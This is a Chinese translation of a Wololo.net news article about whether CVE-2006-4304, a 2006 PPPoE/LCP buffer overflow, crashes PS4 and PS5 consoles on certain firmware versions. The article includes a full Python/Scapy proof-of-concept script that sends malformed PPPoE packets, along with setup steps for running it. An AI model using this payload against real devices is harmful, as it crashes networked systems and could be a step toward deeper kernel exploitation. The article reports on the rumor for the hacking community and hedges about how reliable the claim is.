<!--yml

类别：未分类

日期：2024-05-27 14:31:00

-->

# 一个18年前的漏洞是否是下一个PS5/PS4越狱的关键？- Wololo.net

> 来源：[https://wololo.net/2024/02/01/is-an-18-year-old-vulnerability-the-key-to-the-next-ps5-ps4-jailbreak/](https://wololo.net/2024/02/01/is-an-18-year-old-vulnerability-the-key-to-the-next-ps5-ps4-jailbreak/)

![](img/abebd53dcd746c4a44571ca3d2db9bea.png)

最初看起来像恶作剧的东西可能会变成实际的PS4/PS5漏洞。虽然现在人们不应过于乐观，因为这可能只是个泡影，但它比表面上看起来的更有趣。

最近几天，在PS4/PS5黑客的Discord、论坛和Twitter上，关于一项18年前的CVE的讨论愈演愈烈。有些人声称，2006年披露的一个网络漏洞可以被利用来越狱最近的PS4和PS5固件，甚至可能是[TheFloW](https://wololo.net/tag/TheFloW)在他最近的一个PlayStation漏洞赏金中使用的漏洞之一（或者是一系列漏洞中的一个）。

早期测试似乎**表明PS4固件在11.00版本及之前，PS5固件在8.20版本及之前确实存在崩溃问题**（这意味着这个问题的补丁可能在[PS5 8.40和PS4 11.02固件](https://wololo.net/2023/12/06/ps5-firmware-8-40-and-ps4-11-02-are-out-and-theres-something-interesting-in-there-dont-update/)中）。

我将首先承认，我最初将原始消息视为恶作剧，但是**这个说法似乎是有根据的**：一个PoC（概念证明）文件正在传播，多人证实它会使他们的PS4和PS5崩溃，直到上述的固件版本。现在，**崩溃本身当然不是漏洞（更不用说可利用的漏洞了）**，但这意味着这个说法现在已经离开了“恶作剧”的领域，值得进一步探讨。而且还有更多内容……

## **2006年的CVE以及PS4/PS5的崩溃PoC**

在人们过度兴奋之前，我想说**这仍然应被视为谣言，或者至少是需要更多有经验的开发人员实际挖掘的事情**。然而，到目前为止发生了以下事情：

+   一个来自2006年的旧CVE（[CVE-2006-4304](https://www.cvedetails.com/cve/CVE-2006-4304/)）最初被一些匿名用户报告为“PS4/PS5 KEX”，就在几天前。包括我在内的多人最初对这一说法持怀疑态度：“不可能有一个18年前的FreeBSD 4漏洞存在于基于FreeBSD 9或以上的PS4或PS5上。”

![](img/d7619f298eef90690aad5cae2b547494.png)

+   然而，一些人已经测试了正在传播的[poc](https://gist.github.com/RobbedColek/8b0bc9655adc6ad9564ad71453188e37)（请注意，提供这个PoC在他们github上的@Colek并不是最初声称这一点的人），并确认它会导致他们的PS4/PS5控制台崩溃，一直到某些特定的固件版本（显然包括PS4 11.00和PS5 8.20）。

![](img/fd57d70e3c9041e1f50a8f2c9fa6acab.png)

![](img/abebd53dcd746c4a44571ca3d2db9bea.png)

截图由hhk2003提供

**CVE内容**：

> *FreeBSD 4.11到6.1中sppp驱动程序中的缓冲区溢出，NetBSD 2.0到20060823之前的4.0 beta，以及OpenBSD 3.8和20060902之前的3.9允许远程攻击者通过制作的Link Control Protocol (LCP)数据包，其选项长度超过总长度，触发(1) pppoe和(2) ippp中的溢出，从而导致拒绝服务（崩溃），获取敏感信息，并可能执行任意代码。*

这似乎是FreeBSD/NetBSD网络堆栈中的一个bug。暂且不论18年前的漏洞如何仍存在于现代游戏机中是多么疯狂，至少我们知道TheFloW过去一直在大量调查这部分代码（目前已知的PS5内核漏洞仅来自TheFloW，与网络堆栈相关）。

**漏洞描述**：

```
from scapy.all import PPPoED, Ether, sniff, sendp, srp1, hexdump

source = b"\xXX\xXX\xXX\xXX\xXX\xXX" # MAC address of your adapter on PC
destination = b"\xXX\xXX\xXX\xXX\xXX\xXX" # MAC address of LAN on your PS4
interface = "Realtek PCIe 2.5GbE Family Controller #2" # get via "ipconfig /all" or eth0 or similiar on Linux

packet = sniff(iface=interface, filter="pppoed", count=1)
tag_value = packet[PPPoED][0].tag_list[1].tag_value
payload = destination + source + b"\x88\x63\x11\x07\x00\x00\x00\x0c\x01\x03\x00\x08" + tag_value
sendp(payload, iface=interface)

packet = sniff(iface=interface, filter="pppoed", count=1)
payload = destination + source + b"\x88\x63\x11\x65\x00\x01\x00\x0c\x01\x03\x00\x08" + tag_value
sendp(payload, iface=interface)

packet = sniff(iface=interface, filter="pppoes", count=1)
payload = destination + source + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff"
packet = srp1(Ether(payload), iface=interface)
print(hexdump(packet))

payload = destination + source + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff" + b"\xff" * 256 # this number might be different, just a guess
for i in range(20):
sendp(payload, iface=interface)
```

## 结论：PS4/PS5上是否存在新的漏洞？

我脑海中浮现了几个想法：

+   依我看，如果一个CVE中的bug在某个系统上已经修复，通常不应该在打了补丁后再导致崩溃。我知道在某些罕见的情况下，崩溃可能是唯一的出路，但根据我的经验，大多数bug修复都意图优雅地处理错误情况。**崩溃不是利用漏洞**，但看到这段代码实际上导致PS4和PS5崩溃确实很有趣。

    +   一个更可能的解释，而不是一个旧的bug浮出水面，是一个新的（或类似的）bug，碰巧通过代码库中的相似路径触发了。

    +   也有可能，PS4/PS5网络堆栈的一些部分不是基于FreeBSD，而是一些其他PS4/PS5特定的代码，可能仍然存在问题，因为它们不是FreeBSD补丁的一部分。

+   **我特别感兴趣的是一些最近的固件没有崩溃**。这**意味着Sony已经修复了一些问题，或者在最近的固件中修改了那个区域的代码**（实际上在PS4 11.02和PS5 8.40发布时有[强烈暗示](https://wololo.net/2023/12/06/ps5-firmware-8-40-and-ps4-11-02-are-out-and-theres-something-interesting-in-there-dont-update/)）。这是进一步确认，这个崩溃可能与最近向Sony工程师披露的漏洞有关（例如，TheFloW的一个漏洞并不是不可能的情况）。

+   有些人已经确认，有缺陷的代码确实在某个时间点存在于 PS4 的代码库中。尤其是在 PS5 研发 Discord 中，SlidyBat 表示 PS4 中似乎确实有某些函数使用了旧的有缺陷代码：

![](img/bcb248dd281b3a6f20ce9b99b4839872.png)

![](img/c63d66c0e851e0950365ffe173a678e0.png)

![](img/4b41463a03c4b95f3c9176dfd36c70da.png)

## 下载并测试 PoC

当然，现在**还为时过早去说这是否会对 PS4 和 PS5 产生任何影响**，但毫无疑问，这看起来**比我最初想象的要有趣得多**，就在几天前。我们目前处于早期阶段，尽管这对于没有足够技能进一步挖掘的人来说并不实用，但或许试着在他们的 PS4 和 PS5 上运行 PoC 也无妨。

随意尝试并在评论中报告这是否导致了您的控制台崩溃（以及您使用的固件版本）。

请理解，在当前阶段，这只会使您的控制台崩溃，并且设置起来并不明显：您需要一些基本的脚本技能。如果您不能按照如何编辑脚本和运行它的说明操作，我强烈建议您不要费心了。

1.  在此获取 PoC：[https://gist.github.com/RobbedColek/8b0bc9655adc6ad9564ad71453188e37](https://gist.github.com/RobbedColek/8b0bc9655adc6ad9564ad71453188e37)

    +   需要 Python 3 和 Scapy。

1.  通过 LAN 电缆将您的 PS4/PS5 直接连接到 PC。

1.  为您的 PS4/PS5 设置手动以太网连接通过 PPPoE - 输入任何用户名/密码。

1.  根据您的家用 PC 和目标控制台更新“源”、“目的地”和“接口”细节在脚本中。 <-- **如果您不知道如何操作并且无法弄清楚，请立即停止，这并不适合您，也不会有所帮助**

1.  在控制台上使用“测试互联网连接”。

1.  启动脚本。

如果成功，它将会使您的控制台崩溃。

## 参考资料

+   原始声明：[https://wololo.net/2024/01/26/ps5-update-8-60-is-here-and-guess-what-dont-update/comment-page-1/#comment-6543161](https://wololo.net/2024/01/26/ps5-update-8-60-is-here-and-guess-what-dont-update/comment-page-1/#comment-6543161)

+   PS4/PS5 的 PoC：[https://gist.github.com/RobbedColek/8b0bc9655adc6ad9564ad71453188e37](https://gist.github.com/RobbedColek/8b0bc9655adc6ad9564ad71453188e37)

+   CVE：[https://www.cvedetails.com/cve/CVE-2006-4304/](https://www.cvedetails.com/cve/CVE-2006-4304/)

+   OpenBSD 修补程序以修复 2006 年的漏洞：[https://ftp.openbsd.org/pub/OpenBSD/patches/3.8/common/014_sppp.patch](https://ftp.openbsd.org/pub/OpenBSD/patches/3.8/common/014_sppp.patch)

*正如我在这篇文章中尽力做到准确和精确。如果您注意到有遗漏或错误的地方，请在评论中告诉我。谢谢*
